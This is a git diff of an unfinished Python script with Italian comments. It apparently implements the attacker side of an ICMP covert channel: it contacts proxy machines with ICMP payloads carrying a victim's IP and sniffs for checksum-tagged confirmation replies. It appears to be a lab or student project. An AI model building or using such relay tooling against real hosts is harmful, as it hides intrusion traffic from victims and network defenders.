@@ -9,6 +9,8 @@ import threading
 import comunication_methods as com  
 import re
 import sys
+import datetime
+
 
 def analizza_pacchetto(packet):#ex packet_callback 
     if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
@@ -115,44 +117,72 @@ def unisciDati(dati):
         seg+=1 
     return payload 
 
-def conn_to_Vittima(ip_vittima):
-    print(f"Tentativo di connessione con {ip_vittima}...") 
-    data="".join(
-        "__CONNECT__ "+proxy_IP[index] if index==0 
-        else ", "+proxy_IP[index] 
-        for index in range(len(proxy_IP)
-    ))
-    com.send_packet(data,ip_vittima) 
+#--Parte 3--#
 
-def callback_test_connection(packet): 
+def callback_wait_answer_proxy(packet): 
+    print("sniffing") 
+    print("Packet received: {}".format(packet.summary())) 
+    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
+        checksum=mymethods.calc_checksum(com.CONFIRM_VICTIM.encode())
+        if packet[ICMP].id==checksum:
+            print(f"Messaggio da {packet[IP].src}")
+            print(f"Payload {packet[Raw].load}")
+            com.set_pkt_conn_received() 
+
+def wait_answer_proxy(ip_src): 
+    checksum=mymethods.calc_checksum(com.CONFIRM_VICTIM.encode())
+    print(f"Aspetto aggiornamento da {ip_src} su {mymethods.iface_from_IP(ip_src)[1]}")
+    args={
+        "filter":f"icmp and src {ip_src} and icmp[4:2]={checksum}"
+        #,"count":"1" 
+        ,"prn":callback_wait_answer_proxy 
+        #,"store":True 
+        ,"iface":mymethods.iface_from_IP(ip_src)[1] 
+    } 
+    com.sniff_packet(args) 
+    com.wait_pkt_conn_received() 
+    if com.sniffer.running: 
+        com.sniffer.stop() 
+    if com.timeout_timer.is_alive():
+        com.timeout_timer.cancel() 
+        data=com.CONFIRM_PROXY.encode()
+        if com.send_packet(data,ip_src):
+            print("Done Waiting")
+            return True 
+    print("Keep waiting")
+    return False
+
+#--Parte 2--#
+def callback_connect_to_proxy(packet): 
     print("Packet received: {}".format(packet.summary())) 
     if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
-        if b'__CONNECT__' in bytes(packet[Raw].load): 
+        if com.CONFIRM_ATTACKER.encode() in packet[Raw].load: 
             print(f"{packet[IP].src} si vuole collegare") 
-            com.pkt_conn_received.set() 
+            com.set_pkt_conn_received() 
         else:
             print(f"Il paccheto proviene da {packet[IP].src} ma non risponde alla connessione alla macchina") 
 
-def test_connection(ip_dst): 
-    print(f"test_connection: {proxy_IP}")
+def connect_to_proxy(ip_dst): 
+    print(f"test_connection: {ip_dst}")
     if type(ip_dst) is not str or re.match(com.ip_reg_pattern, ip_dst) is None:
         raise Exception("IP non valido") 
     if type(ip_vittima) is not str or re.match(com.ip_reg_pattern, ip_vittima) is None:
         raise Exception("IP della vittima sconosciuto")
     
     print(f"Tentativo di connessione con {ip_dst}...")
-    data="__CONNECT__ {}".format(ip_vittima)
+    data=f"{com.CONNECT} {ip_vittima}".encode()
+    print(f"Dati:{data}") 
     if com.send_packet(data,ip_dst):  
         try:
             args={
                 "filter":f"icmp and src {ip_dst}" 
                 #,"count":1 
-                ,"prn":callback_test_connection #com.proxy_callback
+                ,"prn":callback_connect_to_proxy #com.proxy_callback
                 #,"store":True 
                 ,"iface":mymethods.iface_from_IP(ip_dst)[1]
             }
             com.sniff_packet(args) 
-            com.pkt_conn_received.wait()
+            com.wait_pkt_conn_received()
             if com.sniffer.running: 
                 com.sniffer.stop()
                 com.sniffer.join()
@@ -166,6 +196,7 @@ def test_connection(ip_dst):
     print(f"La connessione con {ip_dst} è fallita")
     return False
 
+#--Parte 1--#
 def get_value_of_parser(args):
     if args is None: 
         raise Exception("Nessun argomento passato")
@@ -198,10 +229,16 @@ def def_global_variables():
         #,"192.168.56.1"
         #,"192.168.56.xxx"
     ] 
+
     global sniffed_data
     sniffed_data=[] 
 
-if __name__ == "__main__":
+#-- Main --#
+def parte_2():
+    pass
+
+def part_1():
+    #1) Si controllano gli argomenti
     try:
         def_global_variables()
         args=get_args_from_parser()
@@ -210,20 +247,41 @@ if __name__ == "__main__":
         get_value_of_parser(args)
     except Exception as e: 
         print(f"Eccezione: {e}")
-        exit(1)  
-    #1) Si controlla di poter comunicare
-    try: 
-        proxy_IP=[proxy for proxy in proxy_IP if test_connection(proxy)] 
-        if len(proxy_IP)<1:
-            print("Nessun proxy presente. Prova a indicare un'altra macchina")
-            sys.exit(0)
-            exit(0) 
-        print(f"I proxy raggiungibili sono: {proxy_IP}")
-    except Exception as e:
-        print(f"Eccezione: {e}") 
-        exit(1)
-    #2) si aspetta che i proxy possanno raggiugnere la vittima
+        exit(1) 
+    for proxy in proxy_IP.copy():
+        print(f"Controllo:{proxy}\tDi:{proxy_IP}")
+        #2) Si controlla di poter comunicare con il proxy
+        try: 
+            print("\tconnect_to_proxy")
+            if connect_to_proxy(proxy):
+                #3)si aspetta che i proxy dicano di poter comunicare con la vittima 
+                try:
+                    print("\twait_answer_proxy")
+                    print(datetime.datetime.now())
+                    if not wait_answer_proxy(proxy): 
+                        print(f"proxy_IP before: {proxy_IP}") 
+                        proxy_IP.remove(proxy)
+                        print(f"proxy_IP after: {proxy_IP}")
+                except Exception as e:
+                    print(f"wait_answer_proxy: {e}") 
+            else:
+                print(f"Proxy_IP before:{proxy_IP}")
+                proxy_IP.remove(proxy)
+                print(f"Proxy_IP after:{proxy_IP}")
+        except Exception as e:
+            print(f"connect_to_proxy: {e}") 
+            exit(1) 
+    if len(proxy_IP)<1:
+        print("Nessun proxy presente. Prova a indicare un'altra macchina") 
+        exit(0) 
+    print(f"I proxy raggiungibili sono: {proxy_IP}")
 
+if __name__ == "__main__":
+    #Stabilire connessione
+    part_1()
+    #
+    parte_2()
+    exit(0)
     #3) l'attaccante riceve i messaggi da determinati indirizzi
     print("Inizio Sniffing...") 
     data=ricevi_Messaggi(sniff_args)
